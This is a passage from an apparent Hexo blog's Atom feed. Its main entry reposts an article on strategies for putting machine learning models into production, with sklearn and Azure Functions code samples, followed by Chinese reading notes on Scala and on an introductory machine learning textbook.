title="map"></a>map</h5><h5 id="flatmap"><a href="#flatmap" class="headerlink" title="flatmap"></a>flatmap</h5><h4 id="化简、折叠、扫描"><a href="#化简、折叠、扫描" class="headerlink" title="化简、折叠、扫描"></a>化简、折叠、扫描</h4><h5 id="折叠，化简：将二次元函数引用于集合中的函数。"><a href="#折叠，化简：将二次元函数引用于集合中的函数。" class="headerlink" title="折叠，化简：将二次元函数引用于集合中的函数。"></a>折叠，化简：将二次元函数引用于集合中的函数。</h5><h5 id="折叠，化简：fold"><a href="#折叠，化简：fold" class="headerlink" title="折叠，化简：fold"></a>折叠，化简：fold</h5>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;开一个新坑，Scala这门语言在优化上有很大的操作余地，需要相当的熟练度。本文仅做基础笔记的整理。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Language" scheme="http://yoursite.com/categories/Language/"/>
    
      <category term="Scala" scheme="http://yoursite.com/categories/Language/Scala/"/>
    
    
      <category term="Scala" scheme="http://yoursite.com/tags/Scala/"/>
    
  </entry>
  
  <entry>
    <title>将机器学习模型应用入生产的几种策略</title>
    <link href="http://yoursite.com/2019/06/18/Overview%20of%20the%20different%20approaches%20to%20putting%20Machine%20Learning%20(ML)%20models%20in%20production/"/>
    <id>http://yoursite.com/2019/06/18/Overview of the different approaches to putting Machine Learning (ML) models in production/</id>
    <published>2019-06-18T07:40:44.172Z</published>
    <updated>2019-05-20T19:57:56.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>原文 <a href="https://medium.com/analytics-and-data/overview-of-the-different-approaches-to-putting-machinelearning-ml-models-in-production-c699b34abf86" target="_blank" rel="noopener"><overview of the different approaches to putting machine learning (ml) models in production></overview></a></p></blockquote><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wmih501j20m80fwmzi.jpg" alt></p><a id="more"></a> <p>There are different approaches to putting models into productions, with benefits that can vary dependent on the specific use case. Take for example the use case of churn prediction, there is value in having a static value already that can easily be looked up when someone call a customer service, but there is some extra value that could be gained if for specific events, the model could be re-run with the newly acquired information.</p><p>There is generally different ways to both train and server models into production:</p><ul><li><strong>Train</strong>: one off, batch and real-time/online training</li><li><strong>Serve:</strong> Batch, Realtime (Database Trigger, Pub/Sub, web-service, inApp)</li></ul><p>Each approach having its own set of benefits and tradeoffs that need to be considered.</p><h3 id="One-off-Training"><a href="#One-off-Training" class="headerlink" title="One off Training"></a>One off Training</h3><p>Models don’t necessarily need to be continuously trained in order to be pushed to production. Quite often a model can be just trained ad-hoc by a data-scientist, and pushed to production until its performance deteriorates enough that they are called upon to refresh it.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wn761fzj209m09tq63.jpg" alt></p><blockquote><p>From Jupyter to Prod</p></blockquote><p>DataScientists prototyping and doing machine learning tend to operate in their environment of choice <a href="https://jupyter.org/" target="_blank" rel="noopener">Jupyter</a> Notebooks. Essentially an advanced GUI on a <a href="https://en.wikipedia.org/wiki/Read–eval–print_loop" target="_blank" rel="noopener">repl</a>, that allows you to save both code and command outputs.</p><p>Using that approach it is more than feasible to push an ad-hoc trained model from some piece of code in Jupyter to production. Different types of libraries and other notebook providers help further tie the link between the data-scientist workbench and production.</p><h4 id="Model-Format"><a href="#Model-Format" class="headerlink" title="Model Format"></a>Model Format</h4><p><a href="https://docs.python.org/3/library/pickle.html" target="_blank" rel="noopener">Pickle</a> converts a python object to to a bitstream and allows it to be stored to disk and reloaded at a later time. It is provides a good format to store machine learning models provided that their intended applications is also built in python.</p><p><a href="https://github.com/onnx" target="_blank" rel="noopener">ONNX</a> the Open Neural Network Exchange format, is an open format that supports the storing and porting of predictive model across libraries and languages. Most deep learning libraries support it and sklearn also has a library extension to convert their model to <a href="https://github.com/onnx/sklearn-onnx/blob/master/docs/tutorial.rst" target="_blank" rel="noopener">ONNX’s format</a>.</p><p><a href="https://en.wikipedia.org/wiki/Predictive_Model_Markup_Language" target="_blank" rel="noopener">PMML</a> or Predictive model markup language, is another interchange format for predictive models. Like for ONNX sklearn also has another library extension for converting the models to <a href="https://github.com/jpmml/sklearn2pmml" target="_blank" rel="noopener">PMML format</a>. It has the drawback however of only supporting certain type of prediction models.PMML has been around since 1997 and so has a large footprint of applications leveraging the format. Applications such as <a href="https://archive.sap.com/kmuuid2/a07faefd-61d7-2c10-bba6-89ac5ffc302c/Integrating Real-time Predictive Analytics into SAP Applications.pdf" target="_blank" rel="noopener">SAP</a> for instance is able to leverage certain versions of the PMML standard, likewise for CRM applications such as <a href="https://community.pega.com/knowledgebase/supported-pmml-model-types" target="_blank" rel="noopener">PEGA</a>.</p><p><a href="http://docs.h2o.ai/h2o/latest-stable/h2o-docs/productionizing.html#about-pojos-and-mojos" target="_blank" rel="noopener">POJO and MOJO </a>are <a href="https://www.h2o.ai/" target="_blank" rel="noopener">H2O.ai</a>’s export format, that intendeds to offers an easily embeddable model into java application. They are however very specific to using the H2O’s platform.</p><h4 id="Training"><a href="#Training" class="headerlink" title="Training"></a>Training</h4><p>For one off training of models, the model can either be trained and fine tune adhoc by a data-scientists or training through AutoML libraries. Having an easily reproducible setup, however helps pushing into the next stage of productionalization, ie: batch training.</p><h3 id="Batch-Training"><a href="#Batch-Training" class="headerlink" title="Batch Training"></a>Batch Training</h3><p>While not fully necessary to implement a model in production, batch training allows to have a constantly refreshed version of your model based on the latest train.</p><p>Batch training can benefit a-lot from AutoML type of frameworks, AutoML enables you to perform/automate activities such as feature processing, feature selection, model selections and parameter optimization. Their recent performance has been on par or bested the most diligent data-scientists.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wnpy6yjj20m80gntax.jpg" alt></p><p>Using them allows for a more comprehensive model training than what was typically done prior to their ascent: simply retraining the model weights.</p><p>Different technologies exists that are made to support this continuous batch training, these could for instance be setup through a mix of <a href="https://medium.com/analytics-and-data/airflow-the-easy-way-f1c26859ee21" target="_blank" rel="noopener">airflow</a> to manage the different workflow and an AutoML library such as <a href="https://epistasislab.github.io/tpot/" target="_blank" rel="noopener">tpot</a>, Different cloud providers offer their solutions for AutoML that can be put in a data workflow. Azure for instance integrates machine learning prediction and model training with their <a href="https://azure.microsoft.com/es-es/blog/retraining-and-updating-azure-machine-learning-models-with-azure-data-factory/" target="_blank" rel="noopener">data factory offering</a>.</p><h3 id="Real-time-training"><a href="#Real-time-training" class="headerlink" title="Real time training"></a>Real time training</h3><p>Real-time training is possible with ‘Online Machine Learning’ models, algorithms supporting this method of training includes K-means (through mini-batch), Linear and Logistic Regression (through Stochastic Gradient Descent) as well as Naive Bayes classifier.</p><p>Spark has StreamingLinearAlgorithm/StreamingLinearRegressionWithSGD to perform these operations, sklearn has SGDRegressor and SGDClassifier that can be incrementally trained. In sklearn, the incremental training is done through the partial_fit method as shown below:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> linear_model</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">X_0 = pd.DataFrame([[<span class="number">0</span>,<span class="number">0</span>], [<span class="number">1</span>,<span class="number">0</span>]] )</span><br><span class="line">y_0 = pd.DataFrame([[<span class="number">0</span>], [<span class="number">0</span>]])</span><br><span class="line"></span><br><span class="line">X_1 = pd.DataFrame([[<span class="number">0</span>,<span class="number">1</span>], [<span class="number">1</span>,<span class="number">1</span>], [<span class="number">1</span>,<span class="number">1</span>]])</span><br><span class="line">y_1 = pd.DataFrame([[<span class="number">1</span>], [<span class="number">1</span>], [<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line">clf = linear_model.SGDClassifier()</span><br><span class="line"></span><br><span class="line">clf.partial_fit(X_0, y_0, classes=[<span class="number">0</span>,<span class="number">1</span>])</span><br><span class="line">print(clf.predict([[<span class="number">0</span>,<span class="number">0</span>]])) <span class="comment"># -&gt; 0</span></span><br><span class="line">print(clf.predict([[<span class="number">0</span>,<span class="number">1</span>]])) <span class="comment"># -&gt; 0</span></span><br><span class="line"></span><br><span class="line">clf.partial_fit(X_1, y_1, classes=[<span class="number">0</span>,<span class="number">1</span>])</span><br><span class="line">print(clf.predict([[<span class="number">0</span>,<span class="number">0</span>]])) <span class="comment"># -&gt; 0</span></span><br><span class="line">print(clf.predict([[<span class="number">0</span>,<span class="number">1</span>]])) <span class="comment"># -&gt; 1</span></span><br></pre></td></tr></table></figure><p>When deploying this type of models there needs to be serious operational support and monitoring as the model can be sensitive to new data and noise, and model performance needs to be monitored on the fly. In offline training, you can filter points of <a href="https://en.wikipedia.org/wiki/Leverage_(statistics" target="_blank" rel="noopener">high leverage</a>) and correct for this type of incoming data. This is much harder to do when you are constantly updating your model training based on a stream of new data points.</p><p>Another challenge that occurs with training online model is that they don’t decay historical information. This means that, on case there are structural changes in your datasets, the model will need to be anyway re-trained and that there will be a big onus in model lifecycle management.</p><h3 id="Batch-vs-Real-time-Prediction"><a href="#Batch-vs-Real-time-Prediction" class="headerlink" title="Batch vs. Real-time Prediction"></a>Batch vs. Real-time Prediction</h3><p>When looking at whether to setup a batch or real-time prediction, it is important to get an understanding of why doing real-time prediction would be important. It can potentially be for getting a new score when significant event happen, for instance what would be the churn score of customer when they call a contact center. These benefits needs to be weighted against the complexity and cost implications that arise from doing real-time predictions.</p><p><strong>Load implications</strong></p><p>Catering to real time prediction, requires a way to handle peak load. Depending on the approach taken and how the prediction ends up being used, choosing a real-time approach, might also require to have machine with extra computing power available in order to provide a prediction within a certain SLA. This contrasts with a batch approach where the predictions computing can be spread out throughout the day based on available capacity.</p><p><strong>Infrastructure Implications</strong></p><p>Going for real-time, put a much higher operational responsibility. People need to be able to monitor how the system is working, be alerted when there is issue as well as take some consideration with respect to failover responsibility. For batch prediction, the operational obligation is much lower, some monitoring is definitely needed, and altering is desired but the need to be able to know of issues arising directly is much lower.</p><p><strong>Cost Implications</strong></p><p>Going for real-time predictions also has costs implications, going for more computing power, not being able to spread the load throughout the day can force into purchasing more computing capacity than you would need or to pay for spot price increase. Depending on the approach and requirements taken there might also be extra cost due to needing more powerful compute capacity in order to meet SLAs. Furthermore, there would tend to be a higher infrastructure footprint when choosing for real time predictions. One potential caveat there is where the choice is made to rely on in app prediction, for that specific scenario the cost might actually end up being cheaper than going for a batch approach.</p><p><strong>Evaluation Implications</strong></p><p>Evaluating the prediction performance in real-time manner can be more challenging than for batch predictions. How do you evaluate performance when you are faced with a succession of actions in a short burst producing multiple predictions for a given customer for instance? Evaluating and debugging real-time prediction models are significantly more complex to manage. They also require a log collection mechanism that allows to both collect the different predictions and features that yielded the score for further evaluation.</p><h3 id="Batch-Prediction-Integration"><a href="#Batch-Prediction-Integration" class="headerlink" title="Batch Prediction Integration"></a>Batch Prediction Integration</h3><p>Batch predictions rely on two different set of information, one is the predictive model and the other one is the features that we will feed the model. In most type of batch prediction architecture, ETL is performed to either fetch pre-calculated features from a specific datastore (feature-store) or performing some type of transformation across multiple datasets to provide the input to the prediction model. The prediction model then iterates over all the rows in the datasets providing the different score.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wou2v4sj20ja08d74l.jpg" alt></p><p>Once all the predictions have been computed, we can then “serve” the score to the different systems wanting to consume the information. This can be done in different manner depending on thee use case for which we want to consume the score, for instance if we wanted to consume the score on a front-end application, we would most likely push the data to a “cache” or NoSQL database such as Redis so that we can offer milliseconds responses, while for certain use cases such as the creation of an email journey, we might just be relying on a CSV SFTP export or a data load to a more traditional RDBMS.</p><h3 id="Real-time-Prediction-integration"><a href="#Real-time-Prediction-integration" class="headerlink" title="Real-time Prediction integration"></a><strong>Real-time Prediction integration</strong></h3><p>Being able to push model into production for real-time applications require 3 base components. A customer/user profile, a set of triggers and predictive models.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wp3or7dj20em02k3yg.jpg" alt></p><p><strong>Profile:</strong> The customer profile contains all the related attribute to the customer as well as the different attributes (eg: counters) necessary in order to make a given prediction. This is required for customer level prediction in order to reduce the latency of pulling the information from multiple places as well as to simplify the integration of machine learning models in productions. In most cases a similar type of data store would be needed in order to effectively fetch the data needed to power the prediction model.</p><p><strong>Triggers:</strong> Triggers are events causing the initiation of process, they can be for churn for instance, call to a customer service center, checking information within your order history, etc …</p><p><strong>Models:</strong> models need to have been pre-trained and typically exported to one of the 3 formats previously mentioned (pickle, ONNX or PMML) to be something that we could easily port to production.</p><p>There are quite a few different approach to putting models for scoring purpose in production:</p><ul><li><em>Relying on in Database integration:</em> a lot of database vendors have made a significant effort to tie up advanced analytics use cases within the database. Be it by direct integration of Python or R code, to the import of PMML model.</li><li><em>Exploiting a Pub/Sub model</em>: The prediction model is essentially an application feeding of a data-stream and performing certain operations, such as pulling customer profile information.</li><li><em>Webservice:</em> Setting up an API wrapper around the model prediction and deploying it as a web-service. Depending on the way the web-service is setup it might or might not do the pull or data needed to power the model.</li><li><em>inApp:</em> it is also possible to deploy the model directly into a native or web application and have the model be run on local or external datasources.</li></ul><h4 id="Database-integrations"><a href="#Database-integrations" class="headerlink" title="Database integrations"></a><em>Database integrations</em></h4><p>If the overall size of your database is fairly small (&lt; 1M user profile) and the update frequency is occasional it can make sense to integrate some of the real-time update process directly within the database.</p><p>Postgres possess an integration that allows to run Python code as functions or stored procedure called <a href="http://pl/Python" target="_blank" rel="noopener">PL/Python</a>. This implementation has access to all the libraries that are part of the <strong>PYTHONPATH</strong>, and as such are able to use libraries such as Pandas and SKlearn to run some operations.</p><p>This can be coupled with Postgres’ <a href="https://www.tutorialspoint.com/postgresql/postgresql_triggers.htm" target="_blank" rel="noopener">Triggers</a> Mechanism to perform a run of the database and update the churn score. For instance if a new entry is made to a complaint table, it would be valuable to have the model be re-run in real-time.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wpd8zz1j20f10b5q39.jpg" alt></p><p><strong>Sequence flow</strong></p><p>The flow could be setup in the following way:</p><p><em>New Event:</em> When a new row is inserted in the complain table, an event trigger is generated.</p><p><em>Trigger:</em> The trigger function would update the number of complaint made by this customer in the customer profile table and fetch the updated record for the customer.</p><p><em>Prediction Request:</em> Based on that it would re-run the churn model through PL/Python and retrieve the prediction.</p><p><em>Customer Profile Update:</em> It can then re-update the customer profile with the updated prediction. Downstream flows can then happen upon checking if the customer profile has been updated with new churn prediction value.</p><p><strong>Technologies</strong></p><p>Different databases are able to support the running of Python script, this is the case of PostGres which has a native Python integration as previosuly mentioned, but also of Ms SQL Server through its’ <a href="https://www.sqlshack.com/how-to-use-python-in-sql-server-2017-to-obtain-advanced-data-analytics/" target="_blank" rel="noopener">Machine Learning Service (in Database)</a>, other databases such as Teradata, are able to run R/Python script through an external script command. While Oracle supports <a href="https://docs.oracle.com/database/121/DMPRG/GUID-55C6ADBF-DA64-48B6-A424-5F0A59CD406D.htm#DMPRG701" target="_blank" rel="noopener">PMML model</a> through its data mining extension.</p><h4 id="Pub-Sub"><a href="#Pub-Sub" class="headerlink" title="Pub/Sub"></a>Pub/Sub</h4><p>Implementing real-time prediction through a pub/sub model allows to be able to properly handle the load through throttling. For engineers, it also means that they can just feed the event data through a single “logging” feed, to which different application can subscribe.</p><p>An example, of how this could be setup is shown below:</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wpl246sj20m8058aah.jpg" alt></p><p>The page view event is fired to a specific event topic, on which two application subscribe a page view counter, and a prediction. Both of these application filter out specific relevant event from the topic for their purpose and consume the different messages in the topics. The page view counter app, provides data to power a dashboard, while the prediction app, updates the customer profile.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wpsew6sj20fg08x74h.jpg" alt></p><p><strong>Sequence flow:</strong></p><p>Event messages are pushed to the pub/sub topic as they occur, the prediction app poll the topic for new messages. When a new message is retrieved by the prediction app, it will request and retrieve the customer profile and use the message and the profile information to make a prediction. which it will ultimately push back to the customer profile for further use.</p><p>A slightly different flow can be setup where the data is first consumed by an “enrichment app” that adds the profile information to the message and then pushes it back to a new topic to finally be consumed by the prediction app and pushed onto the customer profile.</p><p><strong>Technologies:</strong></p><p>The typical open source combination that you would find that support this kind of use case in the data ecosystem is a combination of Kafka and Spark streaming, but a different setup is possible on the cloud. On google notably a google pub-sub/dataflow (Beam) provides a good alternative to that combination, on azure a combination of Azure-Service Bus or Eventhub and Azure Functions can serve as a good way to consume the mesages and generate these predictions.</p><p><em>Web Service</em></p><p>We can implement models into productions as web-services. Implementing predictions model as web-services are particularly useful in engineering teams that are fragmented and that need to handle multiple different interfaces such as web, desktop and mobile.</p><p>Interfacing with the web-service could be setup in different way:</p><ul><li>either providing an identifier and having the web-service pull the required information, compute the prediction and return its’ value</li><li>Or by accepting a payload, converting it to a data-frame, making the prediction and returning its’ value.</li></ul><p>The second approach is usually recommended in cases, when there is a lot of interaction happening and a local cache is used to essentially buffer the synchronization with the backend systems, or when needing to make prediction at a different grain than a customer id, for instance when doing session based predictions.</p><p>The systems making use of local storage, tend to have a reducer function, which role is to calculate what would be the customer profile, should the event in local storage be integrated back. As such it provides an approximation of the customer profile based on local data.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g37wq0vsywj20ix0b5mxt.jpg" alt></p><p><strong>Sequence Flow</strong></p><p>The flow for handling the prediction using a mobile app, with local storage can be described in 4 phases.</p><p><em>Application Initialization (1 to 3)**</em>:** The application initializes, and makes a request to the customer profile, and retrieve its initial value back, and initialize the profile in local storage.</p><p><em>Applications (4):</em> The application stores the different events happening with the application into an array in local storage.</p><p><em>Prediction Preparation (5 to 8)**</em>:*<em> The application wants to retrieve a new churn prediction, and therefore needs to prepare the information it needs to provide to the Churn Web-service. For that, it makes an initial request to local storage to retrieve the values of the profile and the array of events it has stored. Once they are retrieve, it makes a request to a reducer function providing these values as arguments, the reducer function outputs an updated</em> profile with the local events incorporated back into this profile.</p><p><em>Web-service Prediction (9 to 10):</em> The application makes a request to the churn prediction web-service, providing the different the updated*/reduced customer profile from step 8 as part of the payload. The web-service can then used the information provided by the payload to generate the prediction and output its value, back to the application.</p><p><strong>Technologies</strong></p><p>There are quite a few technologies that can be used to power a prediction web-service:</p><p><em>Functions</em></p><p>AWS Lambda functions, Google Cloud functions and Microsoft Azure Functions (although Python support is currently in Beta) offer an easy to setup interface to easily deploy scalable web-services.</p><p>For instance on Azure a prediction web-service could be implemented through a function looking roughly like this:</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> azure.functions <span class="keyword">as</span> func</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.externals <span class="keyword">import</span> joblib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(req: func.HttpRequest)</span> -&gt; func.HttpResponse:</span></span><br><span class="line">    logging.info(<span class="string">'Python HTTP trigger function processed a request.'</span>)</span><br><span class="line">    <span class="keyword">if</span> req.body:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            logging.info(<span class="string">"Converting Request to DataFrame"</span>)</span><br><span class="line">            req_body = req.get_json()</span><br><span class="line">            df_body  = pd.DataFrame([req_body])</span><br><span class="line"></span><br><span class="line">            logging.info(<span class="string">"Loadding the Prediction Model"</span>)</span><br><span class="line">            filename = <span class="string">"model.pckl"</span></span><br><span class="line">            loaded_model = joblib.load(filename)</span><br><span class="line">            <span class="comment"># Features names need to have been added to the pickled model</span></span><br><span class="line">            feature_names = loaded_model.feature_names</span><br><span class="line">            <span class="comment"># subselect only the feature names </span></span><br><span class="line">            </span><br><span class="line">            logging.info(<span class="string">"Subselecting the dataframe"</span>)</span><br><span class="line">            df_subselect = df_body[feature_names]</span><br><span class="line">            </span><br><span class="line">            logging.info(<span class="string">"Predicting the Probability"</span>)</span><br><span class="line">            result = loaded_model.predict_proba(df_subselect)</span><br><span class="line">            <span class="comment"># We are looking at the probba prediction for class 1</span></span><br><span class="line">            prediction = result[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> func.HttpResponse(<span class="string">"&#123;prediction&#125;"</span>.format(prediction=prediction), status_code=<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> func.HttpResponse(</span><br><span class="line">             <span class="string">"Please pass a name on the query string or in the request body"</span>,</span><br><span class="line">             status_code=<span class="number">400</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure><p><em>Container</em></p><p>An alternative to functions, is to deploy a flask or django application through a docker container (Amazon ECS, Azure Container Instance or Google Kubernetes Engine). Azure for instance provides an easy way to setup prediction containers through its’ <a href="https://docs.microsoft.com/en-us/azure/machine-learning/service/how-to-deploy-and-where" target="_blank" rel="noopener">Azure Machine Learning service</a>.</p><p><em>Notebooks</em></p><p>Different notebooks providers such as <a href="https://docs.databricks.com/applications/mlflow/models.html" target="_blank" rel="noopener">databricks</a> and <a href="https://www.dataiku.com/dss/features/model-deployment/" target="_blank" rel="noopener">dataiku</a> have notably worked on simplifying the model deployment from their environments. These have the feature of setting up a webservice to a local environment or deploying to external systems such as Azure ML Service, Kubernetes engine etc…</p><h4 id="in-App"><a href="#in-App" class="headerlink" title="in App"></a>in App</h4><p>In certain situations when there are legal or privacy requirements that do not allow for data to be stored outside of an application, or there exists constraints such as having to upload a large amount of files, leveraging a model within the application tend to be the right approach.</p><p>Android-ML Kit or the likes of Caffe2 allows to leverage models within native applications, while <a href="https://www.tensorflow.org/js" target="_blank" rel="noopener">Tensorflow.js</a> and <a href="https://github.com/Microsoft/onnxjs" target="_blank" rel="noopener">ONNXJS</a> allow for running models directly in the browser or in apps leveraging javascripts.</p><h3 id="Considerations"><a href="#Considerations" class="headerlink" title="Considerations"></a>Considerations</h3><p>Beside the method of deployments of the models, they are quite a few important considerations to have when deploying to production.</p><p><strong>Model Complexity</strong></p><p>The complexity of the model itself, is the first considerations to have. Models such as a linear regressions and logistic regression are fairly easy to apply and do not usually take much space to store. Using more complex model such as a neural network or complex ensemble decision tree, will end up taking more time to compute, more time to load into memory on cold start and will prove more expensive to run</p><p><strong>Data Sources</strong></p><p>It is important to consider the difference that could occur between the datasource in productions and the one used for training. While it is important for the data used for the training to be in sync with the context it would be used for in production, it is often impractical to recalculate every value so that it becomes perfectly in-sync.</p><p><strong>Experimentation framework</strong></p><p>Setting up an experimentation framework, A/B testing the performance of different models versus objective metrics. And ensuring that there is sufficient tracking to accurately debug and evaluate models performance a posteriori.</p><h3 id="Wrapping-Up"><a href="#Wrapping-Up" class="headerlink" title="Wrapping Up"></a>Wrapping Up</h3><p>Choosing how to deploy a predictive models into production is quite a complex affair, there are different way to handle the lifecycle management of the predictive models, different formats to stores them, multiple ways to deploy them and very vast technical landscape to pick from.</p><p>Understanding specific use cases, the team’s technical and analytics maturity, the overall organization structure and its’ interactions, help come to the the right approach for deploying predictive models to production.</p><hr><p>More from me on <a href="https://medium.com/analytics-and-data" target="_blank" rel="noopener">Hacking Analytics</a>:</p><ul><li><a href="https://medium.com/analytics-and-data/on-the-evolution-of-data-engineering-c5e56d273e37" target="_blank" rel="noopener">One the evolution of Data Engineering</a></li><li><a href="https://medium.com/analytics-and-data/airflow-the-easy-way-f1c26859ee21" target="_blank" rel="noopener">Airflow, the easy way</a></li><li><a href="https://medium.com/analytics-and-data/e-commerce-analysis-data-structures-and-applications-6420c4fa65e7" target="_blank" rel="noopener">E-commerce Analysis: Data-Structures and Applications</a></li><li><a href="https://medium.com/analytics-and-data/setting-up-airflow-on-azure-connecting-to-ms-sql-server-8c06784a7e2b" target="_blank" rel="noopener">Setting up Airflow on Azure &amp; connecting to MS SQL Server</a></li><li><a href="https://medium.com/analytics-and-data/3-simple-rules-to-build-machine-learning-models-that-add-value-61106db88461" target="_blank" rel="noopener">3 simple rules to build machine learning Models that add value</a></li></ul><blockquote><p>简单看了下，没有深入纠结，本文主要从离线和实时两个方面介绍了ML的应用，给了一些简单的例子。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;原文 &lt;a href=&quot;https://medium.com/analytics-and-data/overview-of-the-different-approaches-to-putting-machinelearning-ml-models-in-production-c699b34abf86&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;overview of the different approaches to putting machine learning (ml) models in production&gt;&lt;/overview&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/bec9bff2gy1g37wmih501j20m80fwmzi.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Reading notes" scheme="http://yoursite.com/categories/Reading-notes/"/>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/categories/Reading-notes/Mechine-Learning/"/>
    
    
      <category term="Reading notes" scheme="http://yoursite.com/tags/Reading-notes/"/>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/tags/Mechine-Learning/"/>
    
  </entry>
  
  <entry>
    <title>Machine Learning</title>
    <link href="http://yoursite.com/2019/06/18/Machine%20Learning/"/>
    <id>http://yoursite.com/2019/06/18/Machine Learning/</id>
    <published>2019-06-18T07:40:44.171Z</published>
    <updated>2019-05-10T06:59:57.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>周志华的同名书籍的阅读笔记，入门读物</p></blockquote><a id="more"></a> <h2 id="第一章-绪论"><a href="#第一章-绪论" class="headerlink" title="第一章 绪论"></a>第一章 绪论</h2><h3 id="1-1-引言"><a href="#1-1-引言" class="headerlink" title="1.1 引言"></a>1.1 引言</h3><h3 id="1-2-基本术语"><a href="#1-2-基本术语" class="headerlink" title="1.2 基本术语"></a>1.2 基本术语</h3><p>classification：预测结果是离散值（好瓜、坏瓜）</p><p>regression：预测结果是连续值（成熟度0.95 0.37）</p><p>binary classification：只涉及两个结果的分类，通常称之为一个为positive class 一个为 negative class</p><p>multi-class classification：多分类</p><p>预测任务是希望通过训练对训练集{(x<sub>1</sub>,y<sub>1</sub>),(x<sub>2</sub>,y<sub>2</sub>)…(x<sub>m</sub>,y<sub>m</sub>)}进行学习，建议一个从输入空间X到输出空间Y的映射，对于二分类任务，通常另Y = {-1,1}或者{0,1}，对多分类任务，|Y|&gt;2，回归任务，Y = R，R是实数集。</p><p>学习完毕模型后，使用其预测的过程叫做测试(testing)，被预测的样本称为“测试样本”(testing sample)，例如在学得f之后，对测视例x，可得到其预测目标y = f(x).</p><p>聚类（clustering），即将训练集中的西瓜分为若干组（cluster），在聚类学习中，分的类我们是事先不知道的，学习过程中使用的训练样本通常不配拥有标记信息。</p><p>根据训练数据是否用哦与标记信息，学习任务大致可以划分为两大类：“监督学习（supervised learning）和非监督学习（unsupervised learning），分类和回归是前者的代表，聚类是后者的代表”</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;周志华的同名书籍的阅读笔记，入门读物&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Reading notes" scheme="http://yoursite.com/categories/Reading-notes/"/>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/categories/Reading-notes/Mechine-Learning/"/>
    
    
      <category term="Reading notes" scheme="http://yoursite.com/tags/Reading-notes/"/>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/tags/Mechine-Learning/"/>
    
  </entry>
  
  <entry>
    <title>LabelEnconder 和 OneHotEncoder</title>
    <link href="http://yoursite.com/2019/06/18/LabelEnconder/"/>
    <id>http://yoursite.com/2019/06/18/LabelEnconder/</id>
    <published>2019-06-18T07:40:44.159Z</published>
    <updated>2019-05-09T06:42:45.000Z</updated>
    
